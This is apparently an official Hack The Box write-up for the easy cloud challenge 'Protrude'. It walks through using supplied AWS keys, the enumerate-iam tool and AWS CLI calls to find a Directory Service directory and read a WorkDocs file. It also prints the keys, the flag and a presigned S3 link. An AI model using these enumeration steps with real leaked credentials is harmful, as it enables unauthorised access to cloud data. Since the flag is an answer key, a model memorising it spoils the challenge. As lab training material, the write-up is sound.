![banner](Protrude.assets/banner.png)



<img src="Protrude.assets/htb.png" style="margin-left: 20px; zoom: 40%;" align=left />        <font size="10">Protrude</font>

​	2<sup>nd</sup> May 2024 / Document No D24.102.67

​	Prepared By: felamos

​	Challenge Author(s): felamos

​	Difficulty: <font color=green>Easy</font>

​	Classification: Confidential

# Synopsis

Protrude represents an easy level cloud challenge, designed to showcase AWS directory service and AWS workdocs permission misconfiguration.

# Description
We have obtained leaked account pertaining to Vault 101, with suspicion that it may be linked to one of the leaders group. Your task is to enumerate and see if we can infiltrate them internally.

```
Access key ID,Secret access key, region name
AKIAXYAFLIG2JE6MC2SY,teWVv0GzIBKS23uozxUGmUH+muE5XB86fnZmRZXu, us-east-1
```

# Flag

`HTB{v4Ul7I0i_i5_L0vely_I5n'7_I7?}`

# Solution

We are already provided with AWS access key and a region name. Lets use aws cli to configure for later use. Please following https://aws.amazon.com/cli/ in order to install this tool.

```
aws configure
AWS Access Key ID [****************]: AKIAXYAFLIG2JE6MC2SY
AWS Secret Access Key [****************]: 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
Default region name []: us-east-1
Default output format []: json
```

Now that the account is configured, we can move on to the next step which is to enumerate all aws permission on this account. It would be like shooting blindly if we start using the tool without knowing what kind of access it has. In order to achieve this we will make use of enumerate-iam tool which can be found on github https://github.com/andresriancho/enumerate-iam. Lets clone it.

```
git clone https://github.com/andresriancho/enumerate-iam
Cloning into 'enumerate-iam'...
remote: Enumerating objects: 56, done.
remote: Counting objects: 100% (26/26), done.
```

Once we have cloned the tool we can install missing modules if there are any but to use it we will need to provide access key and secret key as shown below.

```
python3 enumerate-iam.py --access-key AKIAXYAFLIG2JE6MC2SY --secret-key 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
2024-05-02 20:10:34,564 - 89774 - [INFO] Starting permission enumeration for access-key-id "AKIAXYAFLIG2JE6MC2SY"
2024-05-02 20:10:37,272 - 89774 - [INFO] -- Account ARN : arn:aws:iam::532587168180:user/aalmodovar
2024-05-02 20:10:37,272 - 89774 - [INFO] -- Account Id  : 532587168180
2024-05-02 20:10:37,272 - 89774 - [INFO] -- Account Path: user/aalmodovar
2024-05-02 20:10:37,441 - 89774 - [INFO] Attempting common-service describe / list brute force.
2024-05-02 20:10:39,157 - 89774 - [INFO] -- dynamodb.describe_endpoints() worked!
2024-05-02 20:10:40,985 - 89774 - [ERROR] Remove codedeploy.list_deployment_targets action
2024-05-02 20:10:43,060 - 89774 - [ERROR] Remove codedeploy.batch_get_deployment_targets action
2024-05-02 20:10:43,203 - 89774 - [ERROR] Remove codedeploy.get_deployment_target action
2024-05-02 20:10:44,297 - 89774 - [INFO] -- ds.describe_directories() worked!
2024-05-02 20:10:50,356 - 89774 - [INFO] -- sts.get_caller_identity() worked!
2024-05-02 20:10:50,506 - 89774 - [INFO] -- sts.get_session_token() worked!
```

According to the tool this access key belong to user aalmodovar and according to fallout lore it may be 
Amata Almodovar or Alphonse Almodovar. The tool has found that we have access dynamodb describe_endpoints and ds describe_directories and other insignificant ones which can ignore for now. Since dynamodb one does not lead anywhere we can focus completely on ds which is AWS Directory Service https://aws.amazon.com/directoryservice/. Lets use aws cli to list all AD directories

```
aws ds describe-directories
{
    "DirectoryDescriptions": [
        {
            "DirectoryId": "d-9067e0513b",
            "Name": "vault101.wasteland.local",
            "ShortName": "VAULT101",
            "Size": "Small",
            "Alias": "vault101",
            "AccessUrl": "vault101.awsapps.com",
            "DnsIpAddrs": [
                "172.31.87.164",
                "172.31.31.15"
            ],
            "Stage": "Active",
            "LaunchTime": "2024-04-28T22:47:14.630000+01:00",
            "StageLastUpdatedDateTime": "2024-04-28T22:54:13.623000+01:00",
            "Type": "SimpleAD",
            "VpcSettings": {
                "VpcId": "vpc-0d7b2c5c8509574bd",
                "SubnetIds": [
                    "subnet-0a5022ff1dfdf5518",
                    "subnet-0574f58cd2d4f85ca"
                ],
                "SecurityGroupId": "sg-0bee7f241cef79345",
                "AvailabilityZones": [
                    "us-east-1a",
                    "us-east-1d"
                ]
            },
            "SsoEnabled": true,
            "DesiredNumberOfDomainControllers": 0
        }
    ]
}
```

According to the output there is one directory with id of `d-9067e0513b` and name `VAULT101`, we also see a very interesting `accessUrl` parameter which show cases a website. Lets visit it using our browser.

vault101.awsapps.com

![](Protrude.assets/workdocs.png)

The website seems to be AWS WorkDocs connected to this directories, our enumeration tool did not find any permissions on this but regardless lets try to see activities on this directory for workdocs, we can do that using following command. 

```
aws workdocs describe-activities --organization-id d-9067e0513b

{
 <SNIP>
        {
            "Type": "DOCUMENT_VERSION_VIEWED",
            "TimeStamp": "2024-04-28T23:29:02.323000+01:00",
            "IsIndirectActivity": false,
            "Initiator": {
                "Id": "anonymous"
            },
            "ResourceMetadata": {
                "Type": "document",
                "Name": "flag.txt",
                "Id": "77c4bd695e891b73b67f8c6c11df9baa76b47a2f0fe837ef201f34f5de0fb3e3",
                "Owner": {
                    "Id": "S-1-5-21-1692074632-1250882497-497425265-500&d-9067e0513b"
                }
            }
        },
  <SNIP>
```

The command returns a very interesting Metadata which contains a document type file name `flag.txt` and has an ID and owner. We can actually use aws cli to get this document since we have the document id. We can achieve this using following command.

```
aws workdocs get-document --document-id 77c4bd695e891b73b67f8c6c11df9baa76b47a2f0fe837ef201f34f5de0fb3e3

{
    "Metadata": {
        "Id": "77c4bd695e891b73b67f8c6c11df9baa76b47a2f0fe837ef201f34f5de0fb3e3",
        "CreatorId": "S-1-5-21-1692074632-1250882497-497425265-500&d-9067e0513b",
        "ParentFolderId": "a640c404de3b5999c1d06cdf4eb6b7a29de60b26d1611cc8bc3757447dc49555",
        "CreatedTimestamp": "2024-04-28T23:24:09.164000+01:00",
        "ModifiedTimestamp": "2024-04-28T23:29:39.341000+01:00",
        "LatestVersionMetadata": {
            "Id": "1714343049164-81272441b82c9b001b5dc02d4cc08291587c9fc374f03ac27a71773271311aea",
            "Name": "flag.txt",
            "ContentType": "text/plain",
            "Size": 34,
            "Signature": "d2e51309fefb4b367def2c26cb725048",
            "Status": "ACTIVE",
            "CreatedTimestamp": "2024-04-28T23:24:09.164000+01:00",
            "ModifiedTimestamp": "2024-04-28T23:24:09.164000+01:00",
            "CreatorId": "S-1-5-21-1692074632-1250882497-497425265-500&d-9067e0513b",
            "Thumbnail": {
                "LARGE": "https://gb-prod-doc-source.s3.amazonaws.com/77c4bd695e891b73b67f8c6c11df9baa76b47a2f0fe837ef201f34f5de0fb3e3/1714343049164-81272441b82c9b001b5dc02d4cc08291587c9fc374f03ac27a71773271311aea/PDF_LARGE?response-content-disposition=attachment%3B%20filename%2A%3DUTF-8%27%27LARGE&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEAwaCXVzLWVhc3QtMSJGMEQCICFWeBVMxr%2FI%2BsvfQDTy7vyD%2BpgTiIiI9pKcveuOdilZAiATSungpHGTaM0hoyYRIwqwRSO%2BL26M%2BqU8Y09i5ukJWyrTAwhkEAAaDDk3MzE4NzU1MzAyNyIMTMjl0z79u19N5eFgKrADUbkUcMy%2B2wb2JOz9JFfJ%2FPDOyhzdTlCZYgax4qTllI1Ic85aTms91STsTUtro5tyUACWI30xY7Y0OaIidAV0M4AGeS2B2Hx1GIT4%2BBnV0WobbmvtOuzCVP4xmkW4LjD8G38pmEGW2XQDUvcamDDnuAWL%2FNeRgdWaCSAOlMFE%2FkOtMGkx9KZJPcnUsNRVZsp7RBX0q6gyKzTPKgdmb9f4z6gSZteUCwb0lD0lSU1yavZ5%2B%2B3gN8%2Fa3CiP%2FKHJ4deaHbPxbMASHd3WAw1MOvqra2VfqSjUDgSD0hlazgBvYbMznltIv0ZBNslIuqoWomp82e1aVAs86QDOPtXF2MFs9bM7Dq9l3vMokzxyKZhCl6jaFmXFAirAxVJuvqhHSV5SI4EeuLgCz4poG6ICQn4KWQA7VQsiIX52AJ2w8IYt4jmMEQiLFyRYIQxk18NbJh0420kfFq25AU56dY23%2BuNOTwOy4wCuRI3bfycEhm5jj1%2FJZJdO08NS9LF8C1QW7Fq0U6r1ZxguNV7T4r9vx0nIfTwIxm1X7%2BECcOyLBNkfoC%2F1BpsFYG2INgvdLBuauRFsMI3Lz7EGOqIBeBQYLh45tWzfGNLciSREaTSkzwnl%2BkTVgGza4n6efbCMULO7CkuWXI%2Bo4SnRBQ2r16hNDnhIi%2BscfEBgdXSIOL%2FWjbcr6KOlfkuwukXkjdXLv2LWA3S8DwJEYxGyz%2BRYA3yA2bMClh9J5uvjlP7fjdO9fLfejLX3fJM7OboMj8GY5MpzVBESw4f8vjJKUu9fDOUKsakwxRQM%2FjpAuw9bdBHH&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20240502T191545Z&X-Amz-SignedHeaders=host&X-Amz-Expires=900&X-Amz-Credential=ASIA6FFT7S4B4XNEKW3T%2F20240502%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=7767aebdd6772c8e9cc58f6e2516d9e73b3dfa56d27d972fbc56db82f139e909",
```

This returns multiple links for us to access, we want to choose large image so the picture of the file is clear. We can either use browser to download this file or use curl and save it.

```
curl 'https://gb-prod-doc-source.s3.amazonaws.com/77c4bd695e891b73b67f8c6c11df9baa76b47a2f0fe837ef201f34f5de0fb3e3/1714343049164-81272441b82c9b001b5dc02d4cc08291587c9fc374f03ac27a7<SNIP>' --output f.png
```

![](Protrude.assets/flag.png)